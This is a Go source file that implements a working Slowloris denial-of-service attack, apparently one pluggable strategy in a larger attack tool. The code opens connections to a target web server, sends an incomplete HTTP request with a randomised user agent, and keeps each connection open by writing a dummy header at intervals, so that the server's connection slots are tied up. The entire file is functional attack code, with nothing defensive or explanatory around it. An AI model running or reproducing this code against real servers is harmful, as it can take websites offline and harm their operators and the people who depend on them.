package strategy

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

type SlowlorisClassic struct {
	keepAliveInterval time.Duration
	connectionTimeout time.Duration
	maxSessionLife    time.Duration
	userAgents        []string
	activeConnections int64
	localAddr         *net.TCPAddr
}

func NewSlowlorisClassic(keepAliveInterval time.Duration, bindIP string) *SlowlorisClassic {
	return &SlowlorisClassic{
		keepAliveInterval: keepAliveInterval,
		connectionTimeout: 10 * time.Second,
		maxSessionLife:    5 * time.Minute,
		userAgents:        defaultUserAgents,
		localAddr:         newLocalTCPAddr(bindIP),
	}
}

func (s *SlowlorisClassic) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
	if err != nil {
		return err
	}

	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
	defer cancel()

	var conn net.Conn
	dialer := &net.Dialer{
		Timeout:   s.connectionTimeout,
		LocalAddr: s.localAddr,
	}

	if useTLS {
		tlsConfig := &tls.Config{
			ServerName:         parsedURL.Hostname(),
			InsecureSkipVerify: false,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
	}

	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()
	atomic.AddInt64(&s.activeConnections, 1)
	defer atomic.AddInt64(&s.activeConnections, -1)

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	incompleteRequest := fmt.Sprintf(
		"GET %s?%d HTTP/1.1\r\n"+
		"User-Agent: %s\r\n"+
		"Accept-language: en-US,en,q=0.5\r\n",
		path,
		rand.Intn(2000),
		userAgent,
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(incompleteRequest)); err != nil {
		return fmt.Errorf("failed to write incomplete request: %w", err)
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		case <-ticker.C:
			dummyHeader := fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000))

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write([]byte(dummyHeader)); err != nil {
				return fmt.Errorf("dummy header failed: %w", err)
			}
		}
	}
}

func (s *SlowlorisClassic) Name() string {
	return "slowloris-classic"
}

func (s *SlowlorisClassic) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
